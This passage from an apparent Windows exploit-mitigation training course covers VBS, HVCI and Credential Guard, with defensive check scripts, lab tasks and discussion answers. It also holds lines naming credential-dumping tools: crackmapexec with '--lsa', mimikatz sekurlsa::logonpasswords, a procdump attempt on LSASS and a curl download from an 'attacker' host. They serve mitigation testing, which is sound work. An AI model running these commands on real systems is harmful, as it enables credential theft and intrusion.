    print(f"\n  Remote check for {target} (via WinRM)...")
    print("  [*] Using Invoke-Command over WinRM")

    ps_script = (
        f"$cred = New-Object PSCredential("
        f"'{username}', (ConvertTo-SecureString '{password}' -AsPlainText -Force)); "
        f"Invoke-Command -ComputerName {target} -Credential $cred -ScriptBlock {{ "
        f"(Get-CimInstance -ClassName Win32_DeviceGuard "
        f"-Namespace root/Microsoft/Windows/DeviceGuard)."
        f"SecurityServicesRunning -join ',' }}"
    )

    try:
        result = subprocess.run(
            ["powershell", "-NoProfile", "-Command", ps_script],
            capture_output=True, text=True, timeout=30
        )
        output = result.stdout.strip()
        if "1" in output:
            print(f"  [+] Credential Guard is RUNNING on {target}")
        elif "2" in output:
            print(f"  [+] HVCI is RUNNING on {target}")
        else:
            print(f"  [-] Security services on {target}: {output or 'none detected'}")
    except Exception as e:
        print(f"  [!] Remote check failed: {e}")

def main():
    parser = argparse.ArgumentParser(description="Credential Guard Verifier")
    parser.add_argument("--target", help="Remote target IP/hostname")
    parser.add_argument("--user", help="Username for remote check")
    parser.add_argument("--pass", dest="password", help="Password for remote check")
    args = parser.parse_args()

    print("=" * 60)
    print("  Credential Guard Verification Tool")
    print("=" * 60)

    if os.name != "nt":
        print("\n  [!] Run this script on Windows for live checks.")
        print("  [*] For remote probing from Linux, use:")
        print("      crackmapexec smb <target> -u user -p pass --lsa")
        print("      (will fail if Credential Guard is active)")
        print("\n  Expected Credential Guard behavior:")
        print("    CG ON:  mimikatz -> NTLM: (null)")
        print("    CG OFF: mimikatz -> NTLM: 5f4dcc3b5aa765d61d8327deb882cf99")
        return

    local_check()

    if args.target and args.user and args.password:
        remote_check(args.target, args.user, args.password)

if __name__ == "__main__":
    main()
```

#### VBS Mitigation Validation Suite

```python
#!/usr/bin/env python3
"""
vbs_validation_suite.py — Complete VBS/HVCI mitigation validation
Demonstrates: End-to-end testing of all Day 5 mitigations.

Runs all checks from Day 5 in a single script:
  1. VBS status and configuration
  2. HVCI enforcement verification
  3. Credential Guard status
  4. SMEP/SMAP/KPTI detection
  5. Speculation control mitigations
  6. Kernel CFG (kCFG) status
  7. Secure Boot verification
  8. WDAC/CI policy status
  9. Vulnerable driver blocklist
  10. Attack surface assessment

Generates a JSON report for comparison across different configurations.

Usage: python vbs_validation_suite.py [--output report.json]
"""
import subprocess
import json
import os
import sys
import datetime
import argparse

def ps(command):
    """Run PowerShell command, return stdout."""
    try:
        r = subprocess.run(
            ["powershell", "-NoProfile", "-Command", command],
            capture_output=True, text=True, timeout=30
        )
        return r.stdout.strip()
    except Exception as e:
        return f"ERROR: {e}"

def check(name, command, interpret_fn=None):
    """Run a check and return structured result."""
    output = ps(command)
    if interpret_fn:
        status, detail = interpret_fn(output)
    else:
        status = "info"
        detail = output
    return {"name": name, "status": status, "output": output, "detail": detail}

def interpret_bool(output):
    if output.lower() in ("true", "1", "enabled", "running"):
        return "enabled", output
    elif output.lower() in ("false", "0", "disabled"):
        return "disabled", output
    return "unknown", output

def run_all_checks():
    """Run comprehensive VBS/HVCI mitigation checks."""
    results = []

    print("[*] Running VBS/HVCI Mitigation Validation Suite...\n")

    # 1. VBS Status
    print("  [1/10] VBS Status...")
    r = check("VBS Status",
        "(Get-CimInstance -ClassName Win32_DeviceGuard "
        "-Namespace root/Microsoft/Windows/DeviceGuard)."
        "VirtualizationBasedSecurityStatus",
        lambda o: ("enabled" if o == "2" else "disabled",
                   {"0":"Off","1":"Configured","2":"Running"}.get(o, o)))
    results.append(r)
    print(f"    -> {r['detail']}")

    # 2. HVCI
    print("  [2/10] HVCI (Memory Integrity)...")
    r = check("HVCI",
        "try { (Get-ItemProperty "
        "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard"
        "\\Scenarios\\HypervisorEnforcedCodeIntegrity' "
        "-Name Enabled -EA Stop).Enabled } catch { 'NOT_SET' }",
        interpret_bool)
    results.append(r)
    print(f"    -> {r['detail']}")

    # 3. Credential Guard (check both registry AND actual running status)
    print("  [3/10] Credential Guard...")
    # First check registry
    reg_output = ps(
        "try { (Get-ItemProperty "
        "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' "
        "-Name LsaCfgFlags -EA Stop).LsaCfgFlags } catch { '0' }")
    # Then check if actually running
    running_output = ps(
        "(Get-CimInstance -ClassName Win32_DeviceGuard "
        "-Namespace root/Microsoft/Windows/DeviceGuard)."
        "SecurityServicesRunning -contains 1")

    is_running = running_output.lower() == "true"
    reg_status = {"0":"Disabled","1":"UEFI Lock","2":"No Lock"}.get(reg_output, reg_output)

    if is_running:
        status = "enabled"
        detail = f"{reg_status} (Running)"
    elif reg_output in ("1", "2"):
        status = "disabled"
        detail = f"{reg_status} (Configured but NOT running - requires Enterprise/Education)"
    else:
        status = "disabled"
        detail = "Disabled"

    results.append({"name": "Credential Guard", "status": status,
                   "output": f"Registry:{reg_output}, Running:{running_output}",
                   "detail": detail})
    print(f"    -> {detail}")

    # 4. Secure Boot
    print("  [4/10] Secure Boot...")
    r = check("Secure Boot",
        "try { Confirm-SecureBootUEFI } catch { 'ERROR' }",
        interpret_bool)
    results.append(r)
    print(f"    -> {r['detail']}")

    # 5. LSASS Protection (RunAsPPL)
    print("  [5/10] LSASS RunAsPPL...")
    r = check("LSASS RunAsPPL",
        "try { (Get-ItemProperty "
        "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' "
        "-Name RunAsPPL -EA Stop).RunAsPPL } catch { '0' }",
        lambda o: ("enabled" if o in ("1", "2") else "disabled",
                   {"0":"Disabled","1":"Enabled","2":"Enabled (UEFI)"}.get(o, o)))
    results.append(r)
    print(f"    -> {r['detail']}")

    # 6. Kernel DMA Protection
    print("  [6/10] Kernel DMA Protection...")
    r = check("Kernel DMA Protection",
        "(Get-CimInstance -ClassName Win32_DeviceGuard "
        "-Namespace root/Microsoft/Windows/DeviceGuard)."
        "AvailableSecurityProperties -contains 7",
        interpret_bool)
    results.append(r)
    print(f"    -> {r['detail']}")

    # 7. Code Integrity Policy
    print("  [7/10] Code Integrity Policy...")
    r = check("CI Policy",
        "(Get-CimInstance -ClassName Win32_DeviceGuard "
        "-Namespace root/Microsoft/Windows/DeviceGuard)."
        "CodeIntegrityPolicyEnforcementStatus",
        lambda o: ("enabled" if o == "2" else "disabled" if o == "0" else "audit",
                   {"0":"Off","1":"Audit","2":"Enforced"}.get(o, o)))
    results.append(r)
    print(f"    -> {r['detail']}")

    # 8. Vulnerable Driver Blocklist
    print("  [8/10] Vulnerable Driver Blocklist...")
    r = check("Driver Blocklist",
        "try { (Get-ItemProperty "
        "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\CI\\Config' "
        "-Name VulnerableDriverBlocklistEnable -EA Stop)."
        "VulnerableDriverBlocklistEnable } catch { 'NOT_SET' }",
        lambda o: ("enabled" if o == "1" else "disabled" if o == "0" else "unknown", o))
    results.append(r)
    print(f"    -> {r['detail']}")

    # 9. WDigest (cleartext creds)
    print("  [9/10] WDigest Cleartext Caching...")
    r = check("WDigest",
        "try { (Get-ItemProperty "
        "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest' "
        "-Name UseLogonCredential -EA Stop).UseLogonCredential } "
        "catch { 'NOT_SET' }",
        lambda o: ("disabled" if o in ("0", "NOT_SET") else "enabled",
                   "Disabled (secure)" if o in ("0", "NOT_SET") else "Enabled (INSECURE!)"))
    results.append(r)
    print(f"    -> {r['detail']}")

    # 10. DEP System Policy
    print("  [10/10] System DEP Policy...")
    r = check("DEP Policy",
        "(Get-CimInstance Win32_OperatingSystem)."
        "DataExecutionPrevention_SupportPolicy",
        lambda o: ("enabled" if o in ("1","3") else "partial" if o == "2" else "disabled",
                   {"0":"Always Off","1":"Always On","2":"Opt-In","3":"Opt-Out"}.get(o,o)))
    results.append(r)
    print(f"    -> {r['detail']}")

    return results

def generate_report(results, output_file=None):
    """Generate attack surface assessment and optional JSON report."""
    print("\n" + "=" * 60)
    print("  MITIGATION VALIDATION REPORT")
    print("=" * 60)

    enabled = sum(1 for r in results if r["status"] == "enabled")
    disabled = sum(1 for r in results if r["status"] == "disabled")
    total = len(results)

    print(f"\n  Score: {enabled}/{total} mitigations enabled")
    print(f"  {'='*40}")

    for r in results:
        icon = {"enabled":"+", "disabled":"-", "audit":"~"}.get(r["status"], "?")
        print(f"  [{icon}] {r['name']:<30} {r['detail']}")

    # Attack surface assessment
    print(f"\n  Attack Surface Assessment:")
    print(f"  {'-'*40}")

    status_map = {r["name"]: r["status"] for r in results}

    attacks = [
        ("Kernel shellcode injection",
         status_map.get("HVCI") == "enabled",
         "HVCI"),
        ("Unsigned driver loading",
         status_map.get("HVCI") == "enabled",
         "HVCI"),
        ("LSASS credential dumping (mimikatz)",
         status_map.get("Credential Guard") == "enabled" or
         status_map.get("LSASS RunAsPPL") == "enabled",
         "CG/PPL"),
        ("Pass-the-Hash attacks",
         status_map.get("Credential Guard") == "enabled",
         "CG"),
        ("WDigest cleartext password theft",
         status_map.get("WDigest") == "disabled",
         "WDigest disabled"),
        ("DMA attacks (Thunderbolt/PCILeech)",
         status_map.get("Kernel DMA Protection") == "enabled",
         "DMA Prot"),
        ("BYOVD (signed vuln drivers)",
         status_map.get("Driver Blocklist") == "enabled",
         "Blocklist (partial)"),
        ("Firmware/bootkit attacks",
         status_map.get("Secure Boot") == "enabled",
         "Secure Boot"),
        ("Data-only kernel attacks (token swap)",
         False,  # No current mitigation fully prevents this
         "None (KDP partial)"),
    ]

    for attack, blocked, mitigation in attacks:
        icon = "X" if blocked else "!"
        status = "BLOCKED" if blocked else "VIABLE"
        print(f"  [{icon}] {attack:<35} {status:<10} [{mitigation}]")

    # Save report
    if output_file:
        report = {
            "timestamp": datetime.datetime.now().isoformat(),
            "hostname": os.environ.get("COMPUTERNAME", "unknown"),
            "score": f"{enabled}/{total}",
            "results": results,
        }
        with open(output_file, "w") as f:
            json.dump(report, f, indent=2)
        print(f"\n  [*] Report saved to: {output_file}")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--output", "-o", help="Output JSON report file")
    args = parser.parse_args()

    print("=" * 60)
    print("  VBS/HVCI Mitigation Validation Suite")
    print(f"  Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}")
    print("=" * 60)

    if os.name != "nt":
        print("\n  [!] This script must be run on Windows.")
        print("  [*] Transfer to target: python -m http.server 8080")
        print("  [*] On target: curl http://attacker:8080/vbs_validation_suite.py -o v.py")
        print("  [*] Run: python v.py --output report.json")
        return

    results = run_all_checks()
    generate_report(results, args.output)

if __name__ == "__main__":
    main()
```

#### Task 1: Enable VBS and HVCI

1. Check current VBS status with `Get-CimInstance Win32_DeviceGuard`
2. Enable HVCI via Windows Settings (Settings → Privacy & Security → Windows Security → Device Security → Core Isolation → Memory Integrity)
3. Reboot and verify HVCI is running (check SecurityServicesRunning contains 2)
4. Document the security services enabled

**Note**: VBS is automatically enabled when HVCI is turned on. You don't need to enable VBS separately.

#### Task 2: Credential Guard Testing

**IMPORTANT**: This task requires Windows Enterprise or Education edition. Windows Pro/Home do not support Credential Guard.

1. Check your Windows edition: `Get-ComputerInfo | Select-Object WindowsEditionId`
2. If Enterprise/Education: Enable Credential Guard via Group Policy
3. Verify it's actually running: Check if SecurityServicesRunning contains 1
4. Run Mimikatz `sekurlsa::logonpasswords` - document failure
5. Compare output with Credential Guard disabled
6. Explain why hashes are inaccessible (isolated in VTL 1)

**Alternative for Windows Pro**: Test LSASS RunAsPPL protection instead:

- Enable RunAsPPL in registry
- Attempt LSASS memory dump with procdump
- Document how RunAsPPL blocks the dump

#### Task 3: HVCI Driver Blocking Test

> [!NOTE]
> Building actual kernel drivers requires the Windows Driver Kit (WDK) and
> code signing certificates. Instead of compiling a driver, we test HVCI
> by attempting to load a known unsigned `.sys` file.

```powershell
# Step 1: Create a dummy "driver" file (just garbage bytes — not a real driver)
# This simulates having an unsigned .sys file
fsutil file createnew C:\Windows_Mitigations_Lab\bin\fake_unsigned.sys 4096

# Step 2: Attempt to register it as a kernel service
sc create FakeDriver type= kernel binPath= C:\Windows_Mitigations_Lab\bin\fake_unsigned.sys

# Step 3: Try to start it
sc start FakeDriver
# Without HVCI: Fails (not a valid PE) — but the LOADING attempt is allowed
# With HVCI:    Fails EARLIER — HVCI rejects unsigned code before parsing

# Step 4: Check Event Log for HVCI block
Get-WinEvent -LogName "Microsoft-Windows-CodeIntegrity/Operational" -MaxEvents 10 |
    Where-Object { $_.Id -in @(3089, 3077) } |
    Select-Object TimeCreated, Id, Message
# Event ID 3089: Signing information for blocked file
# Event ID 3077: Code integrity enforcement block

# Step 5: Verify HVCI is actually enforcing
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard |
    Select-Object CodeIntegrityPolicyEnforcementStatus
# 2 = Enforced (HVCI active)
# 1 = Audit mode
# 0 = Off

# Step 6: Clean up
sc delete FakeDriver

# Real-world BYOVD test:
# A SIGNED but VULNERABLE driver (e.g., Capcom.sys, DBUtil_2_3.sys)
# will PASS HVCI signature checks and load successfully.
# This is the BYOVD attack vector — HVCI checks integrity, not quality.
# However, the Vulnerable Driver Blocklist (if enabled) blocks known bad drivers.
```

#### Task 4: Kernel Token Attack Simulation

```python
#!/usr/bin/env python3
# vbs_token_test.py - Demonstrates VBS/KDP protection concept
# Educational: Shows what kernel exploits try to do

import ctypes
import struct

def explain_token_attack():
    """Explain what kernel token attacks try to achieve"""
    print("=" * 60)
    print("Kernel Token Manipulation Attack (Educational)")
    print("=" * 60)

    print("""
Without VBS/HVCI:
1. Exploit kernel vulnerability to get read/write primitive
2. Find current process EPROCESS structure
3. Locate Token pointer in EPROCESS
4. Copy SYSTEM process token to current process
5. Result: Current process now has SYSTEM privileges

With VBS/HVCI enabled (but WITHOUT KDP on Token):
1. Same kernel vulnerability exploited
2. Same read/write primitive achieved
3. Attempt to modify Token pointer
4. Modification SUCCEEDS - Token is NOT KDP-protected!
5. Exploit SUCCEEDS - privilege escalation works
6. This is why CVE-2024-21338 worked even with VBS+HVCI!

With VBS/HVCI + KDP on Token (future/theoretical):
1. Same kernel vulnerability exploited
2. Same read/write primitive achieved
3. Attempt to modify Token pointer
4. KDP BLOCKS modification - Token is in protected memory
5. Exploit FAILS - cannot escalate privileges

CRITICAL REALITY:
- HVCI protects CODE integrity (blocks unsigned kernel code)
- HVCI does NOT protect DATA integrity (allows token modification)
- EPROCESS.Token is NOT KDP-protected in current Windows versions
- KDP is opt-in and rarely used for critical structures

Protected Structures (KDP - when drivers opt in):
- Driver-specific data sections (via MmProtectDriverSection)
- NOT automatically: EPROCESS.Token, EPROCESS.SecurityDescriptor
- This is the gap that data-only attacks exploit!
""")

    # Simulate checking if protection would work
    print("\n[*] Simulating protection check...")
    print("[+] If HVCI enabled: Kernel shellcode BLOCKED")
    print("[!] If HVCI enabled: Token modification STILL WORKS (data-only attack)")
    print("[+] If KDP on Token (future): Token modification BLOCKED")
    print("[-] If VBS disabled: Both shellcode AND token attacks work")

if __name__ == "__main__":
    explain_token_attack()
```

### Key Takeaways

1. **VBS creates a hardware-enforced trust boundary**: Even a compromised kernel (VTL 0)
   cannot access Secure World (VTL 1) memory. This is fundamentally different from all
   software-only mitigations we studied in Days 2-4.
2. **HVCI is "code signing for the kernel"**: It prevents unsigned code execution but does
   NOT prevent data corruption. CVE-2024-21338 proved that data-only attacks (token swap)
   work even with HVCI enabled — the same principle as Day 2's data-only technique.
3. **Credential Guard eliminates pass-the-hash**: Credentials stored in VTL 1 are
   inaccessible even to SYSTEM-level attackers. This forces attackers to use Kerberos
   relay/delegation attacks instead of simple credential dumping.
4. **KDP is opt-in, not automatic**: A common misconception is that KDP protects all
   kernel structures. In reality, only data explicitly registered via
   `MmProtectDriverSection()` is protected. EPROCESS.Token is NOT KDP-protected.
5. **BYOVD (Bring Your Own Vulnerable Driver) bypasses HVCI**: Signed drivers with
   known vulnerabilities pass HVCI checks. Microsoft maintains a blocklist, but
   it's always reactive — new vulnerable signed drivers appear regularly.
6. **SMEP/SMAP eliminated classic kernel exploitation**: Pre-2012 kernel exploits could
   execute user-mode shellcode from ring 0. SMEP blocks this entirely. SMAP prevents
   the kernel from reading attacker-controlled user-mode memory.
7. **KVA Shadow (Meltdown mitigation) has real performance cost**: 2-5% with PCID,
   up to 30% without. I/O-intensive workloads are most affected.
8. **Speculation attacks are mitigated, not eliminated**: Retpoline, IBRS, and STIBP
   mitigate known Spectre variants, but new speculation primitives continue to be
   discovered. Hardware fixes in newer CPUs provide better performance than software
   mitigations.
9. **The exploit evolution is clear**: Memory corruption -> ROP -> Data-only -> Logic bugs
   -> Signed driver abuse. Each mitigation layer forced attackers to the next technique.

### Discussion Questions

1. **Can a hypervisor vulnerability compromise VBS?**

   > Yes. If Hyper-V itself has a vulnerability, VTL 1 can be compromised. Hyper-V
   > bugs are rare but extremely high-value (Project Zero has found some). This is
   > why Microsoft runs a dedicated Hyper-V bug bounty with payouts up to $250K.

2. **What attacks remain possible even with VBS+HVCI?**

   > Data-only attacks (token swap if KDP not covering it), logic bugs in signed
   > drivers, BYOVD, supply chain compromise of signed code, firmware/UEFI attacks
   > below VBS, and DMA attacks from PCIe devices without Kernel DMA Protection.

3. **How does VBS affect compatibility with older drivers?**

   > Unsigned drivers cannot load at all. Signed drivers using non-compliant memory
   > operations (W+X pages, modifying read-only sections) will crash. This breaks
   > many older antivirus products, hardware drivers, and virtualization software.
   > Check compatibility with `Get-SystemDriver | Where { !$_.HVCICompliant }`.

4. **Is VBS the future of OS security, or a temporary solution?**

   > VBS is a bridge technology. Long-term, languages like Rust eliminate memory
   > corruption at compile time. But VBS protects existing C/C++ codebases that
   > cannot be rewritten. Expect VBS to remain critical for the next 10+ years.

5. **Why can't "Administrator" access VTL 1 (Secure World) memory?**

   > Administrator runs in VTL 0 (Normal World). The hypervisor (ring -1) enforces
   > VTL isolation using Second Level Address Translation (SLAT/EPT). Even the NT
   > kernel cannot construct page tables that map VTL 1 memory — the hypervisor
   > intercepts and blocks such attempts at the hardware level.

6. **How does Pluton differ from a traditional TPM 2.0 chip?**

   > Traditional TPMs are discrete chips connected via LPC/SPI bus — an attacker
   > with physical access can sniff the bus ("bus interposer" attack). Pluton is
   > integrated INTO the CPU die, eliminating the physical bus attack surface.
   > Pluton also receives firmware updates via Windows Update, unlike TPMs which
   > rarely receive firmware patches.

7. **If HVCI blocks unsigned drivers, how do "BYOVD" attacks still work?**

   > BYOVD uses drivers that ARE legitimately signed (by Microsoft or WHQL). The
   > driver has a known vulnerability (e.g., arbitrary kernel read/write via IOCTL).
   > HVCI validates the signature (valid!) but cannot assess code quality. The
   > attacker exploits the signed driver's vulnerability to achieve kernel access.
   > Microsoft's Vulnerable Driver Blocklist mitigates this reactively.

8. **Why does Credential Guard require UEFI Secure Boot to be effective?**

   > Without Secure Boot, an attacker could install a bootkit that loads before the
   > hypervisor and either disables VBS entirely or intercepts credentials before
   > they reach VTL 1. Secure Boot ensures the boot chain is trusted from firmware
   > to hypervisor to secure kernel. BlackLotus (CVE-2022-21894) demonstrated what
   > happens when Secure Boot is bypassed.

9. **What types of kernel attacks remain viable even with VBS enabled?**
   > Data-only attacks (overwrite non-KDP-protected data like tokens, file paths,
   > security descriptors), logic bugs in signed drivers (TOCTOU, type confusion),
   > BYOVD with signed-but-vulnerable drivers, and attacks targeting the hypervisor
   > itself. The key insight from this entire week: as code-flow protections improve,
   > attackers pivot to data-flow attacks.

